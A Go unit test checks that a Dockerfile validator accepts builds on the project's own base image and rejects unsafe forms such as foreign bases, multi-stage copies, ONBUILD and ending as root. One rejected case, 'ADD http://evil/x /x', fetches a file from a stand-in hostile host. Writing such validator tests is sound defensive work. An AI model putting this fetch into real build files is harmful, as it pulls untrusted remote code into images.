package builder

import (
	"errors"
	"testing"

	"vibe/internal/domain"
)

func TestValidateDockerfile(t *testing.T) {
	valid := `ARG VIBE_BASE_IMAGE
FROM ${VIBE_BASE_IMAGE}
RUN apt-get update && apt-get install -y blender
COPY build/tool /usr/local/bin/tool
USER root
RUN echo setup
USER vscode
`
	if err := ValidateDockerfile([]byte(valid)); err != nil {
		t.Fatalf("valid dockerfile rejected: %v", err)
	}
	// No USER lines at all inherits vscode from the base.
	if err := ValidateDockerfile([]byte("ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nRUN true\n")); err != nil {
		t.Fatalf("userless dockerfile rejected: %v", err)
	}

	cases := map[string]string{
		"syntax directive": "# syntax=docker/dockerfile:1\nARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\n",
		"foreign base":     "ARG VIBE_BASE_IMAGE\nFROM ubuntu:24.04\n",
		"multi-stage":      "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nFROM ${VIBE_BASE_IMAGE}\n",
		"add":              "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nADD http://evil/x /x\n",
		"copy --from":      "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nCOPY --from=busybox:latest /bin/busybox /x\n",
		"copy --from=0":    "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\ncopy --FROM=0 /x /x\n",
		"onbuild":          "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nONBUILD RUN true\n",
		"ends as root":     "ARG VIBE_BASE_IMAGE\nFROM ${VIBE_BASE_IMAGE}\nUSER root\n",
		"no from":          "RUN true\n",
		"missing arg decl": "FROM ${VIBE_BASE_IMAGE}\n",
	}
	for name, content := range cases {
		t.Run(name, func(t *testing.T) {
			if err := ValidateDockerfile([]byte(content)); !errors.Is(err, domain.ErrInvalid) {
				t.Fatalf("expected invalid, got %v", err)
			}
		})
	}
}
